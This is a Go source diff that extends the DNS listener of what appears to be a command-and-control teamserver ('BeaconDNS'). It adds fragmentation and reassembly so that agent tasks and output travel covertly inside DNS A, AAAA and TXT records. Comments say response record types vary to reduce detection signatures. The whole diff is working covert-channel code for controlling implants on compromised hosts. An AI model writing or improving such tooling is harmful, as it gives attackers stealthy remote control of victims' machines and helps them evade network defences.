@@ -9,6 +9,7 @@ import (
 	"net"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"crypto/rc4"
@@ -21,6 +22,18 @@ import (
 // troubleshooting BeaconDNS behavior.
 const dnsDebug = false
 
+type dnsFragBuf struct {
+	total  uint32
+	buf    []byte
+	filled uint32
+}
+
+type dnsDownBuf struct {
+	total uint32
+	off   uint32
+	buf   []byte
+}
+
 type DNS struct {
 	Config DNSConfig
 	Name   string
@@ -28,6 +41,10 @@ type DNS struct {
 
 	server *dns.Server
 	ts     Teamserver
+
+	mu        sync.Mutex
+	upFrags   map[string]*dnsFragBuf
+	downFrags map[string]*dnsDownBuf
 }
 
 func (d *DNS) Start(ts Teamserver) error {
@@ -48,6 +65,8 @@ func (d *DNS) Start(ts Teamserver) error {
 
 	d.server = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
 	d.ts = ts
+	d.upFrags = make(map[string]*dnsFragBuf)
+	d.downFrags = make(map[string]*dnsDownBuf)
 
 	go func() {
 		if err := d.server.ListenAndServe(); err != nil {
@@ -70,6 +89,61 @@ func (d *DNS) Stop() error {
 	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
 	defer cancel()
 	return d.server.ShutdownContext(ctx)
+}
+
+func (d *DNS) handlePutFragment(sid string, seq int, data []byte) {
+	if sid == "" || len(data) == 0 {
+		_ = d.ts.TsAgentProcessData(sid, data)
+		return
+	}
+	if len(data) <= 8 {
+		_ = d.ts.TsAgentProcessData(sid, data)
+		return
+	}
+
+	total := binary.BigEndian.Uint32(data[0:4])
+	offset := binary.BigEndian.Uint32(data[4:8])
+	chunk := data[8:]
+
+	const maxUploadSize = 1 << 20
+	if total == 0 || total > maxUploadSize {
+		_ = d.ts.TsAgentProcessData(sid, data)
+		return
+	}
+
+	if offset == 0 && total <= uint32(len(chunk)) {
+		_ = d.ts.TsAgentProcessData(sid, chunk)
+		return
+	}
+
+	key := sid
+	if seq > 0 {
+		key = fmt.Sprintf("%s:%08x", sid, uint32(seq))
+	}
+
+	d.mu.Lock()
+	defer d.mu.Unlock()
+
+	fb, ok := d.upFrags[key]
+	if !ok {
+		buf := make([]byte, total)
+		fb = &dnsFragBuf{total: total, buf: buf}
+		d.upFrags[key] = fb
+	}
+	if offset >= fb.total {
+		return
+	}
+	end := offset + uint32(len(chunk))
+	if end > fb.total {
+		end = fb.total
+	}
+	n := end - offset
+	copy(fb.buf[offset:end], chunk[:n])
+	fb.filled += n
+	if fb.filled >= fb.total {
+		_ = d.ts.TsAgentProcessData(sid, fb.buf)
+		delete(d.upFrags, key)
+	}
 }
 
 // 协议约定（简化版）：
@@ -106,8 +180,12 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 		if len(base) >= 5 {
 			sid = base[0]
 			op = strings.ToUpper(base[1])
-			seq, _ = strconv.Atoi(base[2])
-			idx, _ = strconv.Atoi(base[3])
+			if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
+				seq = int(v)
+			}
+			if v, err := strconv.ParseUint(base[3], 16, 32); err == nil {
+				idx = int(v)
+			}
 
 			_ = seq
 			_ = idx
@@ -192,7 +270,11 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 					if dnsDebug {
 						fmt.Printf("[BeaconDNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
 					}
-					_ = d.ts.TsAgentProcessData(sid, dataB)
+					// 应用层分片由 handlePutFragment 负责重组
+					d.handlePutFragment(sid, seq, dataB)
+					if sid != "" {
+						_ = d.ts.TsAgentSetTick(sid)
+					}
 				}
 			}
 			// ACK：返回一个最小响应（不同 QType 返回不同 RR，以降低特征）
@@ -208,25 +290,66 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			}
 
 		case "GET":
-			// 下行：从 TS 中取数据并映射到 A/AAAA/TXT RR
-			var payload []byte
+			// 下行：从 TS 中取数据，并按 [total_len][offset][chunk] 做应用层分片
+			var frame []byte
 			if sid != "" {
-				// maxDataSize 只限制打包后的任务总大小，不是单个 DNS 包大小；
-				// 具体分片仍由 PktSize 控制。因此这里给一个相对宽松的上限，
-				// 避免像 dir c:\ 这种输出被 TsTaskGetAvailableTasks 直接过滤掉。
-				maxDataSize := d.Config.PktSize * 256
-				if maxDataSize <= 0 || maxDataSize > 0x1900000 {
-					maxDataSize = 0x1900000
+				// 先尝试从缓存中取下行缓冲
+				var df *dnsDownBuf
+				d.mu.Lock()
+				if buf, ok := d.downFrags[sid]; ok {
+					df = buf
 				}
-				if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil {
-					payload = p
-					if dnsDebug {
-						fmt.Printf("[BeaconDNS] GET tasks sid=%s pkt=%d\n", sid, len(payload))
+				d.mu.Unlock()
+
+				// 如果没有缓存或已发送完，则从 TS 获取新的打包任务
+				if df == nil || df.off >= df.total {
+					maxDataSize := d.Config.PktSize * 256
+					if maxDataSize <= 0 || maxDataSize > 0x1900000 {
+						maxDataSize = 0x1900000
+					}
+					if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
+						if dnsDebug {
+							fmt.Printf("[BeaconDNS] GET tasks sid=%s total=%d\n", sid, len(p))
+						}
+						if sid != "" {
+							_ = d.ts.TsAgentSetTick(sid)
+						}
+						df = &dnsDownBuf{total: uint32(len(p)), off: 0, buf: p}
+						d.mu.Lock()
+						d.downFrags[sid] = df
+						d.mu.Unlock()
+					}
+				}
+
+				// 如果当前存在待发送的缓冲，则构造一个带头部的分片
+				if df != nil && df.off < df.total {
+					// 为了兼容 TXT RDATA 255 字节长度限制，这里控制每个分片大小。
+					maxChunk := d.Config.PktSize
+					if maxChunk <= 0 || maxChunk > 247 {
+						maxChunk = 247
+					}
+					remaining := df.total - df.off
+					chunkLen := remaining
+					if chunkLen > uint32(maxChunk) {
+						chunkLen = uint32(maxChunk)
+					}
+
+					frame = make([]byte, 8+chunkLen)
+					binary.BigEndian.PutUint32(frame[0:4], df.total)
+					binary.BigEndian.PutUint32(frame[4:8], df.off)
+					copy(frame[8:], df.buf[df.off:df.off+chunkLen])
+
+					df.off += chunkLen
+					if df.off >= df.total {
+						d.mu.Lock()
+						delete(d.downFrags, sid)
+						d.mu.Unlock()
 					}
 				}
 			}
 
-			if len(payload) == 0 {
+			// 根据是否有 frame 生成响应记录
+			if len(frame) == 0 {
 				// 空响应
 				if qtype == "A" {
 					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
@@ -239,6 +362,7 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 					m.Answer = append(m.Answer, rr)
 				}
 			} else {
+				// 对于 TXT：直接返回 frame；对于 A/AAAA：按字节切分到相应 RDATA 中。
 				if qtype == "A" {
 					start := 0
 					maxBytes := d.Config.PktSize
@@ -249,8 +373,8 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						maxBytes = 4
 					}
 					endLimit := start + maxBytes
-					if endLimit > len(payload) {
-						endLimit = len(payload)
+					if endLimit > len(frame) {
+						endLimit = len(frame)
 					}
 					for start < endLimit {
 						end := start + 4
@@ -258,7 +382,7 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 							end = endLimit
 						}
 						chunk := make([]byte, 4)
-						copy(chunk, payload[start:end])
+						copy(chunk, frame[start:end])
 						ip := net.IPv4(chunk[0], chunk[1], chunk[2], chunk[3])
 						rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: ip}
 						m.Answer = append(m.Answer, rr)
@@ -274,8 +398,8 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						maxBytes = 16
 					}
 					endLimit := start + maxBytes
-					if endLimit > len(payload) {
-						endLimit = len(payload)
+					if endLimit > len(frame) {
+						endLimit = len(frame)
 					}
 					for start < endLimit {
 						end := start + 16
@@ -283,26 +407,16 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 							end = endLimit
 						}
 						chunk := make([]byte, 16)
-						copy(chunk, payload[start:end])
+						copy(chunk, frame[start:end])
 						ip := net.IP(chunk)
 						rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: ip}
 						m.Answer = append(m.Answer, rr)
 						start = end
 					}
 				} else {
-					// TXT: 上下行数据用 RC4/pack 处理好了，这里直接返回原始 payload 切片即可
-					start := 0
-					for start < len(payload) {
-						end := start + d.Config.PktSize
-						if end > len(payload) {
-							end = len(payload)
-						}
-						chunk := payload[start:end]
-						// 为了简单，直接按 raw bytes 转 string；真正隐蔽性由上层编码控制
-						rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{string(chunk)}}
-						m.Answer = append(m.Answer, rr)
-						start = end
-					}
+					// TXT: 直接用 frame 构造单条 TXT 记录
+					rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{string(frame)}}
+					m.Answer = append(m.Answer, rr)
 				}
 			}
 
